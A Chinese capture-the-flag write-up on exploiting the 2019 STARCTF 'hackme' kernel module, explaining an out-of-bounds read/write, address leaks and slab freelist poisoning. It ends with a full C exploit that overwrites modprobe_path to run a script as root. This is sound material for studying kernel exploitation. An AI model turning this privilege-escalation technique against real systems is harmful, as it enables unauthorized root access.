<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h1 data-content="1" id="7185f835297bcc5a21ffb68995c1af65">简介</h1>
<p>RW Any Memory的全称是Read and write any memory, 就是内存任意读写;通常这种类型的漏洞是由于越界读写或者错误引用了指针操作造成可以修改控制某个区域里面的指针,导致我们可以改变程序的常规读写区域甚至程序执行流程....<br/>
这里我是利用2019 STARCTF里面的hackeme来演示和学习这种漏洞的利用,其中环境和题目我放在<a href="https://github.com/cc-sir/ctf-challenge/tree/master/2019%20STARCTF%20hackme" target="_blank">github</a>上面了.需要的话可以自行下载学习....</p>
<h1 data-content="1" id="ec08f9373a95db61ca232d85a952a8b6">前置知识</h1>
<h2 data-content="1" id="e0fdfbf7c21d8e365c24221987e74d02">modprobe_path</h2>
<p>modprobe_path指向了一个内核在运行未知文件类型时运行的二进制文件;当内核运行一个错误格式的文件的时候,会调用这个modprobe_path所指向的二进制文件去，如果我们将这个字符串指向我们的自己的二进制文件,那么在发生错误的时候就可以执行我们自己二进制文件了....<br/>
这里modprobe_path的地址可以通过cat直接查看到:</p>
<div class="highlight"><pre><span></span>cat /proc/kallsyms <span class="p">|</span> grep modprobe_path
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190821181216-26c9f5be-c3fc-1.png"/><br/>
原理代码如下,其实就是调用了<code>call_usermodehelper</code>函数:</p>
<div class="highlight"><pre><span></span><span class="kt">int</span> <span class="nf">__request_module</span><span class="p">(</span><span class="kt">bool</span> <span class="n">wait</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">fmt</span><span class="p">,</span> <span class="p">...)</span> 
<span class="p">{</span> 
    <span class="kt">va_list</span> <span class="n">args</span><span class="p">;</span> 
    <span class="kt">char</span> <span class="n">module_name</span><span class="p">[</span><span class="n">MODULE_NAME_LEN</span><span class="p">];</span> 
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">max_modprobes</span><span class="p">;</span> 
    <span class="kt">int</span> <span class="n">ret</span><span class="p">;</span> 
<span class="c1">// char modprobe_path[KMOD_PATH_LEN] = "/sbin/modprobe"; </span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="n">modprobe_path</span><span class="p">,</span> <span class="s">"-q"</span><span class="p">,</span> <span class="s">"--"</span><span class="p">,</span> <span class="n">module_name</span><span class="p">,</span> <span class="nb">NULL</span> <span class="p">};</span> 
    <span class="k">static</span> <span class="kt">char</span> <span class="o">*</span><span class="n">envp</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="s">"HOME=/"</span><span class="p">,</span> 
                <span class="s">"TERM=linux"</span><span class="p">,</span> 
                <span class="s">"PATH=/sbin:/usr/sbin:/bin:/usr/bin"</span><span class="p">,</span> 
                <span class="nb">NULL</span> <span class="p">};</span> <span class="c1">// 环境变量. </span>
    <span class="k">static</span> <span class="n">atomic_t</span> <span class="n">kmod_concurrent</span> <span class="o">=</span> <span class="n">ATOMIC_INIT</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> 
<span class="cp">#define MAX_KMOD_CONCURRENT 50    </span><span class="cm">/* Completely arbitrary value - KAO */</span><span class="cp"> </span>
    <span class="k">static</span> <span class="kt">int</span> <span class="n">kmod_loop_msg</span><span class="p">;</span> 

    <span class="n">va_start</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="n">fmt</span><span class="p">);</span> 
    <span class="n">ret</span> <span class="o">=</span> <span class="n">vsnprintf</span><span class="p">(</span><span class="n">module_name</span><span class="p">,</span> <span class="n">MODULE_NAME_LEN</span><span class="p">,</span> <span class="n">fmt</span><span class="p">,</span> <span class="n">args</span><span class="p">);</span>   
    <span class="n">va_end</span><span class="p">(</span><span class="n">args</span><span class="p">);</span> 
    <span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&gt;=</span> <span class="n">MODULE_NAME_LEN</span><span class="p">)</span> 
        <span class="k">return</span> <span class="o">-</span><span class="n">ENAMETOOLONG</span><span class="p">;</span> 
    <span class="n">max_modprobes</span> <span class="o">=</span> <span class="n">min</span><span class="p">(</span><span class="n">max_threads</span><span class="o">/</span><span class="mi">2</span><span class="p">,</span> <span class="n">MAX_KMOD_CONCURRENT</span><span class="p">);</span>    
    <span class="n">atomic_inc</span><span class="p">(</span><span class="o">&amp;</span><span class="n">kmod_concurrent</span><span class="p">);</span> 
    <span class="k">if</span> <span class="p">(</span><span class="n">atomic_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">kmod_concurrent</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">max_modprobes</span><span class="p">)</span> <span class="p">{</span> 
        <span class="cm">/* We may be blaming an innocent here, but unlikely */</span> 
        <span class="k">if</span> <span class="p">(</span><span class="n">kmod_loop_msg</span><span class="o">++</span> <span class="o">&lt;</span> <span class="mi">5</span><span class="p">)</span> 
            <span class="n">printk</span><span class="p">(</span><span class="n">KERN_ERR</span> 
                   <span class="s">"request_module: runaway loop modprobe %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> 
                   <span class="n">module_name</span><span class="p">);</span> 
        <span class="n">atomic_dec</span><span class="p">(</span><span class="o">&amp;</span><span class="n">kmod_concurrent</span><span class="p">);</span>                           
        <span class="k">return</span> <span class="o">-</span><span class="n">ENOMEM</span><span class="p">;</span>                                         
    <span class="p">}</span> 
    <span class="n">ret</span> <span class="o">=</span> <span class="n">call_usermodehelper</span><span class="p">(</span><span class="n">modprobe_path</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">,</span>        <span class="c1">// 执行用户空间的应用程序</span>
            <span class="n">wait</span> <span class="o">?</span> <span class="nl">UMH_WAIT_PROC</span> <span class="p">:</span> <span class="n">UMH_WAIT_EXEC</span><span class="p">);</span> 
    <span class="n">atomic_dec</span><span class="p">(</span><span class="o">&amp;</span><span class="n">kmod_concurrent</span><span class="p">);</span>                                
    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span> 
<span class="p">}</span>
</pre></div>
<h2 data-content="1" id="666293dadb9fefe7c3162a3dcaea1096">mod_tree</h2>
<p>mod_tree是一块包含了模块指针的内存地址的内核地址,通过查看这个位置我们可以获取到ko文件的地址,在我们需要泄露模块基地址,但是在堆或栈中没有找到的时候可以查看这块内存区域:</p>
<div class="highlight"><pre><span></span>grep mod_tree /proc/kallsyms
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190821181238-33da77d8-c3fc-1.png"/></p>
<h1 data-content="1" id="af44549bb304f21d483ffe8f83469af5">具体分析</h1>
<p>首先我们看到这个hackme.ko文件开始传参大小为<code>0x20</code>:<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20190821181256-3ed0c782-c3fc-1.png"/><br/>
通过分析我们得出ko文件通过一个数据结构heap作为交互接口:</p>
<div class="highlight"><pre><span></span><span class="k">struct</span> <span class="n">heap</span><span class="p">{</span>
    <span class="kt">size_t</span> <span class="n">id</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="o">*</span><span class="n">data</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="n">len</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="n">offset</span><span class="p">;</span>
<span class="p">};</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190821181314-49d6c4a6-c3fc-1.png"/><br/>
程序主要有4个功能:读,写,删除和申请:</p>
<h2 data-content="1" id="5dfc282e1f58858d6284ce12a0d1c829">cin_kernel</h2>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190821181340-5948eb9e-c3fc-1.png"/><br/>
主要是通过用户输入的长度,从用户态中写相应长度的数据到内核;</p>
<h2 data-content="1" id="5910c0f318fa9e5e12520de74079d36e">cout_kernel</h2>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190821181404-673caa6a-c3fc-1.png"/><br/>
从内核中读出相应长度的数据到用户态;</p>
<h2 data-content="1" id="d01ccc0d31e2918ce89dbf4e5e8a748c">delete</h2>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190821181418-6f84633e-c3fc-1.png"/><br/>
这个代码主要是删除pool中的内容;</p>
<h2 data-content="1" id="dd5806b8a51e9d651501de86eae16afc">alloc</h2>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190821181432-78518122-c3fc-1.png"/><br/>
申请一块内存,地址和大小放在<code>pool</code>数组中;<br/>
所以整个程序的功能就是维护了一个全局数组<code>pool</code>,其第一个成员记录内核堆地址，第二个成员记录堆的大小，并且这个数组位于驱动的.bss段,这个我们可以通过gdb调试得出:<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20190821181453-84c04682-c3fc-1.png"/><br/>
所以比较明显的漏洞点:在<code>cin_kernel</code>和<code>cout_kernel</code>功能中存在明显的越界问题,当我们的<code>offset</code>是负数的时候,<code>v17.offset + v17.len</code>就可以向上越界读写任意长度的内存;</p>
<h1 data-content="1" id="3bcba2b23374a06922c85c3db07fb72e">思路</h1>
<p>因为<code>slub</code>分配器的分配原理之前提过,和<code>fastbin</code>的原理比较像,所以我们可以通过越界读写把<code>pool</code>数组的位置申请下来,那么我们就可以控制<code>pool</code>数组,然后将数组上面的指针改为其他地方的地址,那么我们就可以实现任意地址读写了;</p>
<h2 data-content="1" id="0cb4858433da31f09fec64c98a26e3c1">泄露内核地址</h2>
<p>因为我们可以堆地址往上越界读取数据,所以在堆地址上面的地址中一定存在有内核地址,而我们发现往上面偏移<code>0x200</code>的位置就存在有内核地址:<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20190821181514-90e872c2-c3fc-1.png"/><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20190821181532-9ba5d4de-c3fc-1.png"/><br/>
很明显这是应该内核地址,所以我们可以得到内核基地址并且得到<code>mod_tree</code>的地址:</p>
<div class="highlight"><pre><span></span><span class="n">cout_kernel</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">mem</span><span class="p">,</span><span class="mh">0x200</span><span class="p">,</span><span class="o">-</span><span class="mh">0x200</span><span class="p">);</span>
    <span class="n">kernel_addr</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="kt">size_t</span> <span class="o">*</span><span class="p">)</span><span class="n">mem</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x8472c0</span><span class="p">;</span>
    <span class="n">mod_tree_addr</span> <span class="o">=</span> <span class="n">kernel_addr</span> <span class="o">+</span> <span class="mh">0x811000</span><span class="p">;</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"[*]kernel_addr: 0x%16llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">kernel_addr</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"[*]mod_tree_add: 0x%16llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">mod_tree_addr</span><span class="p">);</span>
</pre></div>
<h2 data-content="1" id="a25964d45021ffa5461cf49c7db82f9c">泄露模块地址</h2>
<p>根据<code>fastbin</code>的特点,我们知道<code>fd</code>指针指向下一次我们可以申请的地址,如果我们将<code>fd</code>指针修改了,我们就可以拿到我们想要的内存了,同理我们这里也是通过覆盖<code>fd</code>指针为<code>mod_tree</code>的地址,然后就可以查看<code>mod_tree</code>的内容然后就可以得到模块地址了:<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20190821181546-a3ef75dc-c3fc-1.png"/><br/>
覆盖<code>fd</code>指针的方法是先通过向上越访问就可以修改到<code>fd</code>指针,然后<code>alloc</code>两个块,就可以拿到<code>mod_tree</code>了:</p>
<div class="highlight"><pre><span></span><span class="n">memset</span><span class="p">(</span><span class="n">mem</span><span class="p">,</span><span class="sc">'B'</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
    <span class="o">*</span><span class="p">((</span><span class="kt">size_t</span>  <span class="o">*</span><span class="p">)</span><span class="n">mem</span><span class="p">)</span> <span class="o">=</span> <span class="n">mod_tree_addr</span> <span class="o">+</span> <span class="mh">0x50</span><span class="p">;</span>
    <span class="n">cin_kernel</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="n">mem</span><span class="p">,</span><span class="mh">0x100</span><span class="p">,</span><span class="o">-</span><span class="mh">0x100</span><span class="p">);</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">mem</span><span class="p">,</span><span class="sc">'C'</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span><span class="n">mem</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="n">mem</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
    <span class="n">cout_kernel</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="n">mem</span><span class="p">,</span><span class="mh">0x40</span><span class="p">,</span><span class="o">-</span><span class="mh">0x40</span><span class="p">);</span>
    <span class="n">ko_addr</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="kt">size_t</span> <span class="o">*</span><span class="p">)</span><span class="n">mem</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x2338</span><span class="p">;</span>
</pre></div>
<p>需要注意的是不要把<code>mod_tree</code>地址开始的位置全部覆盖了,应该往下偏移一定的位置,不然我们就得不到模块基地址了,有了模块基地址后我们就可以得到<code>pool</code>的地址了,就可以利用同样的方法把<code>pool</code>申请下来,然后我们就有任意地址读写的能力了;</p>
<h1 data-content="1" id="645a34c7ab3f1e216793abcc0881763b">Use Modprobe_path</h1>
<p>通常我们有了任意地址读写能力后,我们可以通过修改<code>cred</code>结构体或者劫持<code>VDSO</code>来进行高权限的操作,但是这里我们使用一种比较有意思的方法来进行高权限的操作;<br/>
<code>modprobe_path</code>所指的位置通常是发生了错误的时候才调用的:<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20190821181613-b45fa3ce-c3fc-1.png"/><br/>
如果我们把这个位置换成我们最近的二进制文件,那么当发生错误的时候就会以<code>root</code>权限去运行我们二进制文件....<br/>
通常我们可以通过运行一个错误格式的二进制文件来触发调用<code>modprobe_path</code>的内容:</p>
<div class="highlight"><pre><span></span><span class="n">system</span><span class="p">(</span><span class="s">"echo -ne '#!/bin/sh</span><span class="se">\n</span><span class="s">/bin/cp /flag /home/pwn/flag</span><span class="se">\n</span><span class="s">/bin/chmod 777 /home/pwn/flag' &gt; /home/pwn/copy.sh"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"chmod +x /home/pwn/copy.sh"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"echo -ne '</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff' &gt; /home/pwn/sir"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"chmod +x /home/pwn/sir"</span><span class="p">);</span>
</pre></div>
<p>需要注意的是<code>system</code>里面的命令要程序的全路径，而不能是相对路径,<code>cp</code>命令要写成<code>/bin/cp</code>;<br/>
而修改<code>modprobe_path</code>内容的方法和泄露模块地址等用到的方法是一样的....</p>
<h1 data-content="1" id="5afa72c0d0221f14d2b36fc41d0a750f">exp</h1>
<p>exp.c:</p>
<div class="highlight"><pre><span></span><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="cpf">&lt;fcntl.h&gt;</span><span class="cp"></span>

<span class="k">struct</span> <span class="n">heap</span><span class="p">{</span>
    <span class="kt">size_t</span> <span class="n">id</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="o">*</span><span class="n">data</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="n">len</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="n">offset</span><span class="p">;</span>
<span class="p">};</span>
<span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">alloc</span><span class="p">(</span><span class="kt">int</span> <span class="n">id</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">){</span>
    <span class="k">struct</span> <span class="n">heap</span> <span class="n">h</span><span class="p">;</span>
    <span class="n">h</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="n">id</span><span class="p">;</span>
    <span class="n">h</span><span class="p">.</span><span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">;</span>
    <span class="n">h</span><span class="p">.</span><span class="n">len</span> <span class="o">=</span> <span class="n">len</span><span class="p">;</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x30000</span><span class="p">,</span><span class="o">&amp;</span><span class="n">h</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">delete</span><span class="p">(</span><span class="kt">int</span> <span class="n">id</span><span class="p">){</span>
    <span class="k">struct</span> <span class="n">heap</span> <span class="n">h</span><span class="p">;</span>
    <span class="n">h</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="n">id</span><span class="p">;</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x30001</span><span class="p">,</span><span class="o">&amp;</span><span class="n">h</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">cin_kernel</span><span class="p">(</span><span class="kt">int</span> <span class="n">id</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">offset</span><span class="p">){</span>
    <span class="k">struct</span> <span class="n">heap</span> <span class="n">h</span><span class="p">;</span>
    <span class="n">h</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="n">id</span><span class="p">;</span>
    <span class="n">h</span><span class="p">.</span><span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">;</span>
    <span class="n">h</span><span class="p">.</span><span class="n">len</span> <span class="o">=</span> <span class="n">len</span><span class="p">;</span>
    <span class="n">h</span><span class="p">.</span><span class="n">offset</span> <span class="o">=</span> <span class="n">offset</span><span class="p">;</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x30002</span><span class="p">,</span><span class="o">&amp;</span><span class="n">h</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">cout_kernel</span><span class="p">(</span><span class="kt">int</span> <span class="n">id</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">offset</span><span class="p">){</span>
    <span class="k">struct</span> <span class="n">heap</span> <span class="n">h</span><span class="p">;</span>
    <span class="n">h</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="n">id</span><span class="p">;</span>
    <span class="n">h</span><span class="p">.</span><span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">;</span>
    <span class="n">h</span><span class="p">.</span><span class="n">len</span> <span class="o">=</span> <span class="n">len</span><span class="p">;</span>
    <span class="n">h</span><span class="p">.</span><span class="n">offset</span> <span class="o">=</span> <span class="n">offset</span><span class="p">;</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x30003</span><span class="p">,</span><span class="o">&amp;</span><span class="n">h</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/hackme"</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
    <span class="kt">size_t</span> <span class="n">heap_addr</span><span class="p">,</span><span class="n">kernel_addr</span><span class="p">,</span><span class="n">mod_tree_addr</span><span class="p">,</span><span class="n">ko_addr</span><span class="p">,</span><span class="n">pool_addr</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">mem</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"[*]OPEN KO ERROR!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">mem</span><span class="p">,</span><span class="sc">'A'</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">mem</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">mem</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="n">mem</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="n">mem</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="n">mem</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>

    <span class="k">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="k">delete</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span>
    <span class="n">cout_kernel</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="n">mem</span><span class="p">,</span><span class="mh">0x100</span><span class="p">,</span><span class="o">-</span><span class="mh">0x100</span><span class="p">);</span>
    <span class="n">heap_addr</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="kt">size_t</span>  <span class="o">*</span><span class="p">)</span><span class="n">mem</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x100</span><span class="p">;</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"[*]heap_addr: 0x%16llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">heap_addr</span><span class="p">);</span>

    <span class="n">cout_kernel</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">mem</span><span class="p">,</span><span class="mh">0x200</span><span class="p">,</span><span class="o">-</span><span class="mh">0x200</span><span class="p">);</span>
    <span class="n">kernel_addr</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="kt">size_t</span> <span class="o">*</span><span class="p">)</span><span class="n">mem</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x0472c0</span><span class="p">;</span>
    <span class="n">mod_tree_addr</span> <span class="o">=</span> <span class="n">kernel_addr</span> <span class="o">+</span> <span class="mh">0x011000</span><span class="p">;</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"[*]kernel_addr: 0x%16llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">kernel_addr</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"[*]mod_tree_add: 0x%16llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">mod_tree_addr</span><span class="p">);</span>

    <span class="n">memset</span><span class="p">(</span><span class="n">mem</span><span class="p">,</span><span class="sc">'B'</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
    <span class="o">*</span><span class="p">((</span><span class="kt">size_t</span>  <span class="o">*</span><span class="p">)</span><span class="n">mem</span><span class="p">)</span> <span class="o">=</span> <span class="n">mod_tree_addr</span> <span class="o">+</span> <span class="mh">0x50</span><span class="p">;</span>
    <span class="n">cin_kernel</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="n">mem</span><span class="p">,</span><span class="mh">0x100</span><span class="p">,</span><span class="o">-</span><span class="mh">0x100</span><span class="p">);</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">mem</span><span class="p">,</span><span class="sc">'C'</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span><span class="n">mem</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="n">mem</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
    <span class="n">cout_kernel</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="n">mem</span><span class="p">,</span><span class="mh">0x40</span><span class="p">,</span><span class="o">-</span><span class="mh">0x40</span><span class="p">);</span>
    <span class="n">ko_addr</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="kt">size_t</span> <span class="o">*</span><span class="p">)</span><span class="n">mem</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x2338</span><span class="p">;</span>
    <span class="n">pool_addr</span> <span class="o">=</span> <span class="n">ko_addr</span> <span class="o">+</span> <span class="mh">0x2400</span><span class="p">;</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"[*]ko_addr: 0x%16llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">ko_addr</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"[*]pool_addr: 0x%16llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">pool_addr</span><span class="p">);</span>

    <span class="k">delete</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
    <span class="k">delete</span><span class="p">(</span><span class="mi">5</span><span class="p">);</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">mem</span><span class="p">,</span><span class="sc">'D'</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
    <span class="o">*</span><span class="p">((</span><span class="kt">size_t</span>  <span class="o">*</span><span class="p">)</span><span class="n">mem</span><span class="p">)</span> <span class="o">=</span> <span class="n">pool_addr</span> <span class="o">+</span> <span class="mh">0xc0</span><span class="p">;</span>
    <span class="n">cin_kernel</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="n">mem</span><span class="p">,</span><span class="mh">0x100</span><span class="p">,</span><span class="o">-</span><span class="mh">0x100</span><span class="p">);</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span><span class="n">mem</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="n">mem</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>

    <span class="o">*</span><span class="p">((</span><span class="kt">size_t</span> <span class="o">*</span><span class="p">)</span><span class="n">mem</span><span class="p">)</span> <span class="o">=</span> <span class="n">kernel_addr</span> <span class="o">+</span> <span class="mh">0x03f960</span><span class="p">;</span>
    <span class="o">*</span><span class="p">((</span><span class="kt">size_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">mem</span><span class="o">+</span><span class="mh">0x8</span><span class="p">))</span> <span class="o">=</span> <span class="mh">0x100</span><span class="p">;</span>
    <span class="n">cin_kernel</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="n">mem</span><span class="p">,</span><span class="mh">0x10</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>

    <span class="n">strncpy</span><span class="p">(</span><span class="n">mem</span><span class="p">,</span><span class="s">"/home/pwn/copy.sh</span><span class="se">\0</span><span class="s">"</span><span class="p">,</span><span class="mi">18</span><span class="p">);</span>
    <span class="n">cin_kernel</span><span class="p">(</span><span class="mh">0xc</span><span class="p">,</span><span class="n">mem</span><span class="p">,</span><span class="mi">18</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"echo -ne '#!/bin/sh</span><span class="se">\n</span><span class="s">/bin/cp /flag /home/pwn/flag</span><span class="se">\n</span><span class="s">/bin/chmod 777 /home/pwn/flag' &gt; /home/pwn/copy.sh"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"chmod +x /home/pwn/copy.sh"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"echo -ne '</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff' &gt; /home/pwn/sir"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"chmod +x /home/pwn/sir"</span><span class="p">);</span>

    <span class="n">system</span><span class="p">(</span><span class="s">"/home/pwn/sir"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"cat /home/pwn/flag"</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<p>编译:</p>
<div class="highlight"><pre><span></span>gcc exp.c -o exp -w -static
</pre></div>
<p>运行:<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20190821181703-d1d70a8c-c3fc-1.png"/></p>
<h1 data-content="1" id="af8515599842360b67cfed134fb7704b">总结</h1>
